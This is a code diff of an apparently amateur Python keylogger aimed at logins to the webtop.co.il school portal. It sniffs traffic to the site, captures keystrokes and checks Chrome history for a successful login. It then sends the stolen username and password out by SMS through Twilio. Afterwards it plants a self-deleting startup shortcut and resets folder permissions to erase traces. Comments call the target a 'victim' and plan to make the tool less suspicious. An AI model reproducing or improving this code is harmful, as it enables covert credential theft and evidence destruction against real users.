@@ -1,44 +1,55 @@
 from scapy.all import sniff  # packet capture module
-import socket  # to find webtop ip
-import threading  # to use both the keylogger and the packet sniffer
-from pynput.keyboard import Listener  # to use for the keylogger
-# import logging
-import time  # to sleep for 11 seconds while the history page refreshes
-import requests  # to send the password to Twilio so that it can send an sms to me
-import sys
-import os  # find where the history and startup folders are
+import socket  # a module to use socket connection - for me it's used to find webtop ip
+import threading  # to use both the keylogger and the packet sniffer. It's a module to run multiple parts of code at the same time
+from pynput.keyboard import Listener  # to use for the keylogger- module to assist with keyboard operation
+import time  # to sleep for 11 seconds while the history page refreshes - main module for time related commands
+import requests  # to send the password to Twilio so that it can send an sms to me - http module in python
+import sys  # another option for dealing with commands from computer, but different from os
+import os  # uses the computer's system for various commands
 
 PATH_TO_CONNECTIONS = os.environ['USERPROFILE'] + r"\Desktop\system\connections.txt"
-counter = 0
+# to find path to the connections file
 INTERFACE = []
+# the internet interfaces will be put in this list
 caps = False
+# chacking caps in keylogging
 caps_lock_on = False
+# checks for caps lock in keylogging
 shift = False
-isTrue = False
-PATH_TO_PROGRAM = os.environ['USERPROFILE'] + r"\Desktop\system\windows_update_backup.exe"
+# checks for shift in keylogging
+SHORTCUT_PATH = rf"{os.getenv('PROGRAMDATA')}\Microsoft\Windows\Start Menu\Programs\StartUp\test.lnk"
+# to find path to the shortcut that runs the program
+CMD_PATH = r"C:\Windows\System32\cmd.exe"
+# path to cmd
+SYSTEM_PATH = rf"{os.environ['USERPROFILE']}\Desktop\system"
+# path to the system folder where the program is
 STARTUP_DIRECTORY = os.getenv('PROGRAMDATA') + r'\Microsoft\Windows\Start Menu\Programs\StartUp'
-# The history file of chrome could also be in "profile 1" instead of "default" , need to check for both
+# path to the startup folder where shortcut is
 HISTORY_FILE_OPTIONS = [os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\History",
                         os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Profile 1\History"]
-FULL_URL = 'www.webtop.co.il/v2/default.aspx'
-GOT_IN_AFTER_INCORRECT_TRY = 'www.webtop.co.il/v2/default.aspx?loginFailure=1&autoLoad=alert'
-INCORRECT_LOGIN_URL = 'www.webtop.co.il/v2/default.aspx?loginFailure=1'
+# The history file of chrome could also be in "profile 1" instead of "default" , need to check for both
+# The possible paths for the history file
 
-# logdir = os.environ['USERPROFILE'] + cm'\\Desktop\\'
-# logdir = r"C:/Users/Admin/Documents/Yehonatan/Cyber/project/"
-# Uploads logged keys to a file called klog-res.txt
-# logging.basicConfig(filename=(logdir + "123.txt"), level=logging.INFO, format="%(message)s")
-# logs the keys to file
-LIST_OF_SPECIALS = ["Key.tab", "Key.caps_lock", "Key.shift", "Key.ctrl_l", "Key.cmd", "Key.alt_l",
+FULL_URL = 'www.webtop.co.il/v2/default.aspx'
+# the url for webtop once a user logs in
+GOT_IN_AFTER_INCORRECT_TRY = 'www.webtop.co.il/v2/default.aspx?loginFailure=1&autoLoad=alert'
+# a url for the chance that the user fails then succeeds to login into webtop
+INCORRECT_LOGIN_URL = 'www.webtop.co.il/v2/default.aspx?loginFailure=1'
+# url for an incorrect login to webtop
+LIST_OF_SPECIALS = ["Key.caps_lock", "Key.shift", "Key.ctrl_l", "Key.cmd", "Key.alt_l",
                     "Key.alt_r", "Key.menu", "Key.left", "Key.down", "Key.right", "Key.up", "Key.insert",
                     "Key.delete", "Key.print_screen", "Key.home", "Key.end", "Key.page_up", "Key.page_down",
                     "Key.num_lock", "Key.f5", "Key.esc"]
+# list for special keys on the keyboard
 username_and_password = ""
-# Special symbols that can only be achieved with shift letter
+# where the username and password are stored
+
 special_numbers = {"1": "!", "2": "@", "3": "#", "4": "$",
                    "5": "%", "6": "^", "7": "&", "8": "*",
                    "9": "(", "0": ")", "=": "+", "-": "_", "/": "?", ",": "<", ".": ">"}
 
+
+# Special symbols that can only be achieved with shift letter
 
 def on_press(key):
     """ When a key is being pressed, check if it is shift or caps lock. If so, change caps"""
@@ -59,7 +70,6 @@ def on_release(key):
     global LIST_OF_SPECIALS
     if str(key) == "Key.shift":
         change_caps(key)
-    # print('{0} released'.format(key))
     elif str(key) in LIST_OF_SPECIALS:
         pass
     elif str(key) == "Key.backspace":
@@ -105,9 +115,7 @@ def add_password(key):
 
 def run_keylogger():
     """Starts the keylogger"""
-    with Listener(
-            on_press=on_press,
-            on_release=on_release) as listener:
+    with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
 
@@ -134,14 +142,11 @@ def change_caps(key):
 def check_history():
     """Checks if the url of webtop once you log in is in the history file,
      returns True if in the file and False otherwise"""
-    global counter
     global HISTORY_FILE_OPTIONS
     global FULL_URL
     global GOT_IN_AFTER_INCORRECT_TRY
     global INCORRECT_LOGIN_URL
 
-    counter += 1
-    print(counter)
     time.sleep(11)
     file = ""
     # It takes 11 seconds for history page to update
@@ -151,8 +156,8 @@ def check_history():
         except FileNotFoundError as e:
             pass
     read = file.read()
-
-    if FULL_URL in read and INCORRECT_LOGIN_URL not in read or GOT_IN_AFTER_INCORRECT_TRY in read:
+    if FULL_URL in read and INCORRECT_LOGIN_URL not in read and "Webtop" in read or (
+            GOT_IN_AFTER_INCORRECT_TRY in read) and "Webtop" in read:
         return True
     else:
         return False
@@ -198,12 +203,16 @@ def check_internet_sources():
 
 
 def destroy_evidence():
-    global PATH_TO_PROGRAM
+    global PATH_TO_CONNECTIONS
+    global SYSTEM_PATH
+    global SHORTCUT_PATH
+    global CMD_PATH
     """This function will restore all the settings before the download of the program,
-     the shortcut and the program itself"""
+     and create a shortcut that will delete everything from the hack"""
     os.remove(rf"{os.getenv('PROGRAMDATA')}\Microsoft\Windows\Start Menu\Programs\StartUp\test.lnk")
+    create_shortcut = rf'''powershell Set-Variable -Name 'file_location' -Value '"{SHORTCUT_PATH}"'; $WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut($file_location);$Shortcut.TargetPath = '{CMD_PATH}'; $Shortcut.Arguments = '"/min /c rmdir /Q /S """{SYSTEM_PATH}""" && Del /Q ""{SHORTCUT_PATH}"""'; $Shortcut.Save();'''
+    os.system(create_shortcut)
     os.system(f'icacls "{STARTUP_DIRECTORY}" /reset /t')
-    #  os.remove(rf"{PATH_TO_PROGRAM}")
 
 
 def main():
@@ -213,7 +222,7 @@ def main():
     check_internet_sources()
     print('start')
     addr1 = socket.gethostbyname('webtop.co.il')
-    sniff(iface=INTERFACE, filter=f"host {addr1}", count=40)
+    sniff(iface=INTERFACE, filter=f"host {addr1}", count=1)
     tracker = threading.Thread(target=run_keylogger, daemon=True)
     tracker.setDaemon(True)
     tracker.start()
@@ -223,12 +232,10 @@ def main():
         logged_in = check_history()
         if logged_in:
             send_sms()
-            # Leaving log function for now, if I have a use for storing with log instead of variable
-            # log()
             destroy_evidence()
             sys.exit()
         else:
-            print(f"failed try number {counter}")
+            pass
 
 
 if __name__ == "__main__":
@@ -237,24 +244,20 @@ if __name__ == "__main__":
 # Further continue the program beyond product:
 
 # 1) Make the keylogger deal with the shift after the victim entered username and password
-# It is too slow now and can slightly miss Changes in shift and check generally for bugs
+# It is slightly too slow now and can slightly miss Changes in shift and check generally for bugs
 
 # 2) In the log of keylogger, every time the mouse is clicked, go to new line
 # Need to think if this will not make things messier and if so fix that
 
-# 3) For every time a webtop packet goes to sniffer, make a different thread to deal with it,
-# so sniffer won't miss packets. For example, if put incorrect password, the main thread will wait 11 seconds before
-# it checks again. This might be a problem if person inputs password in those 11 seconds
 
-# 4) Check for bugs in general
+# 3) Check for bugs in general
 
-# 5) Change the code so it will rename the history file and after the process is completed switch it back,
-# to make it less suspicious.
+# 4) Add for keylogger delete button that erases key after the cursor
 
-# 6) Add for keylogger delete button that erases key after the cursor
-
-# 7) Add a function that checks if the variable is close to reaching the max amount for a string (or for SMS),
+# 5) Add a function that checks if the variable is close to reaching the max amount for a string (or for SMS),
 # then puts it in a txt
+
+# 6) Add a way to separate the username and password if user hits the shift button
 
 
 # ASSUMPTIONS:
@@ -263,13 +266,4 @@ if __name__ == "__main__":
 # Currently works only for webtop, though it can be changed slightly to find different websites.
 # Works only on google chrome so far (could be changed to work on other applications that save the history in a file -
 # Not in incognito mode for chrome
-
-
-# DONE LIST:
-# 1) When finding history, file can also be in os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Profile 1\History
-# Check for both
-# 2) DONE  check for wifi or ethernet interface, it could be any one of those
-# 3) Find way, after restart, to not delete history but only after first encounter
-# 4) Use Twilio without the helper package - it takes too much and the download time take too long
-# 5) The program will remove all traces of itself, the shortcut and any settings changes it did
-# 6) The program will check for all internet interfaces and sniff through them all.
+# The internet connection has to stay the same for the attack (or until the computer shuts down or restarts)
